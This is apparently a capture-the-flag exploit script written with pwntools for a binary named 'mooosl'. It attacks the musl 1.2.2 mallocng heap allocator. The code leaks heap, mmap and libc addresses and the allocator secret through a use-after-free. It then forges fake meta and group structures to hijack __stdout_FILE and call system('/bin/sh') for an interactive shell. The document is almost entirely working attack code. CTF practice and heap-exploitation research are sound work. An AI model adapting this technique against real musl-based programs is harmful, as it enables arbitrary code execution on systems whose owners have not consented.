from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('mooosl')
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/musl/musl-1.2.2/build/lib/libc.so')
libc = ELF('libc.so')
# libc = ELF('/lib/x86_64-linux-musl/libc.so') 
elf = ELF('mooosl')


def add(key_size, key, value_size, value):
    io.sendlineafter('option: ', '1')
    io.sendlineafter('key size: ', str(key_size))
    io.sendafter('key content: ', key)
    io.sendlineafter('value size: ', str(value_size))
    io.sendafter('value content: ', value)


def show(key_size, key):
    io.sendlineafter('option: ', '2')
    io.sendlineafter('key size: ', str(key_size))
    io.sendafter('key content: ', key)


def delete(key_size, key):
    io.sendlineafter('option: ', '3')
    io.sendlineafter('key size: ', str(key_size))
    io.sendafter('key content: ', key)


def find_key(length = 0x10, hash = 0x7e5):
    while True:
        x = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
        if get_hash(x) == hash:
            return x


def get_hash(content):
    hash = 0x7e5
    for chr in content:
        hash = ord(chr) + hash * 0x13377331
    return hash & 0xfff


def turn_little_end(number):
    result = 0
    for i in range(8):
        result += (int(number[2 * i:2 * i +2], 16) << (8 * i)) 
    return result


def pwn():
    add(0x30, 'a' * 0x30, 0x30, 'a' * 0x30) 
    add(0x30, 'b' * 0x30, 1, 'a')   # AAAAAAU
    
    for _ in range(5):
        show(0x30, 'a' * 0x30)      # AFFFFFU
    add(1, '\n', 0x30, 'a' * 0x30)  # UAAAAAU->UAAAA[U]U
    # key = find_key()
    # print(key)
    key = 'eJpYP1Yx2v9R5v53'
    add(0x10, key, 1, 'a')          # UAAAU[U]U
    delete(1, '\n')                 # FAAAU[F]U
    for _ in range(3):
        show(0x30, 'a' * 0x30)      # FFFFU[F]U
    add(0x1200, 'a\n', 1, 'a')      # AAAAU[U]U
    show(1, '\n')                   # AAAAU[U]U
    io.recvuntil('0x30:')
    data = io.recvline()
    mmap_base = turn_little_end(data[:0x10]) - 0x20
    chunk_addr = turn_little_end(data[0x10:0x20])
    libc_base = mmap_base + 0x4000
    
    for _ in range(3):
        show(0x30, 'a' * 0x30)      # AFFFU[U]U
    payload = p64(0) + p64(chunk_addr - 0x50) + p64(0) + p64(0x30) + p64(0x7e5) + p64(0)
    show(0x30, payload)             # AAAAU[U]U
    show(1, '\n')                   # AAAAU[U]U
    io.recvuntil('0x30:')
    data = io.recvline()
    heap_base = turn_little_end(data[:0x10]) - 0x770

    for _ in range(3):
        show(0x30, 'a' * 0x30)      # AFFFU[U]U
    payload = p64(0) + p64(heap_base) + p64(0) + p64(0x30) + p64(0x7e5) + p64(0)
    show(0x30, payload)             # AAAAU[U]U
    show(1, '\n')                   # AAAAU[U]U
    io.recvuntil('0x30:')
    data = io.recvline()
    secret = turn_little_end(data[:0x10])

    log.success('mmap_base: ' + hex(mmap_base))
    log.success('chunk_addr: ' + hex(chunk_addr))
    log.success('libc_base: ' + hex(libc_base))
    log.success('heap_base: ' + hex(heap_base))
    log.success('secret: ' + hex(secret))
    gdb.attach(io)

    fake_meta_addr = mmap_base + 0x2010
    fake_group_addr = fake_meta_addr + 0x30
    # __stdout_FILE = libc_base + libc.sym['__stdout_FILE']
    __stdout_FILE = libc_base + 0xb4280
    log.success('fake_meta_addr: ' + hex(fake_meta_addr))
    log.success('fake_group_addr: ' + hex(fake_group_addr))
    log.success('__stdout_FILE: ' + hex(__stdout_FILE))

    sc = 8                          # 0x90
    freeable = 1
    last_idx = 0
    maplen = 1
    fake_meta  = p64(__stdout_FILE - 0x18)  # prev
    fake_meta += p64(fake_meta_addr + 0x30) # next
    fake_meta += p64(fake_group_addr)       # mem
    fake_meta += p32(0) * 2                 # avail_mask, freed_mask
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta += p64(0)
    fake_group  = p64(fake_meta_addr)       # meta
    fake_group += p32(1) + p32(0)           # active_idx
    padding = b'a' * 0xaa0
    payload  = padding + p64(secret) + p64(0)
    payload += fake_meta + fake_group + b'\n'
    for _ in range(2):
        show(0x30, 'a' * 0x30)      # AAFFU[U]U
    show(0x1200, payload)           
    payload = p64(0) + p64(fake_group_addr + 0x10) + p64(0) + p64(0x30) + p64(0x7e5) + p64(0)
    add(1, 'a', 0x30, payload)      # UUFFU[U]U
    delete(1, '\n')                 # FUFFU[U]U

    sc = 8                          # 0x90
    last_idx = 1
    fake_meta  = p64(0)                     # prev
    fake_meta += p64(0)                     # next
    fake_meta += p64(fake_group_addr)       # mem
    fake_meta += p32(0) * 2                 # avail_mask, freed_mask
    fake_meta += p64((sc << 6) | last_idx)
    fake_meta += p64(0)
    fake_group  = p64(fake_meta_addr)       # meta
    fake_group += p32(1) + p32(0)           # active_idx
    padding = b'a' * 0xa90
    payload  = padding + p64(secret) + p64(0)
    payload += fake_meta + fake_group + b'\n'
    show(0x30, 'a' * 0x30)          # AUAFU[U]U
    show(0x1200, payload)           
    payload = p64(0) + p64(fake_group_addr + 0x10) + p64(0) + p64(0x30) + p64(0x7e5) + p64(0)
    add(1, 'a', 0x30, payload)      # UUUFU[U]U
    delete(1, '\n')                 # FUUFU[U]U

    fake_meta  = p64(fake_meta_addr)        # prev
    fake_meta += p64(fake_meta_addr)        # next
    fake_meta += p64(__stdout_FILE - 0x10)  # mem
    fake_meta += p32(1) + p32(0)            # avail_mask, freed_mask
    fake_meta += p64((sc << 6) | last_idx)
    fake_meta += b'a' * 0x18
    fake_meta += p64(__stdout_FILE - 0x10)
    padding = b'a' * 0xa80
    payload  = padding + p64(secret) + p64(0)
    payload += fake_meta + b'\n'
    show(0x1200, payload)           
    
    payload  = b'/bin/sh\x00'
    payload += b'a' * 0x20
    payload += p64(heap_base + 1)
    payload += b'a' * 8
    payload += p64(heap_base + 0)
    payload += b'a' * 8
    payload += p64(libc_base + libc.sym['system'])
    payload += b'\n'
    
    io.sendlineafter('option: ', '1')
    io.sendlineafter('key size: ', '1')
    io.sendafter('key content: ', 'a')
    # gdb.attach(io)
    io.sendlineafter('value size: ', str(0x80))
    io.send(payload) 
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()
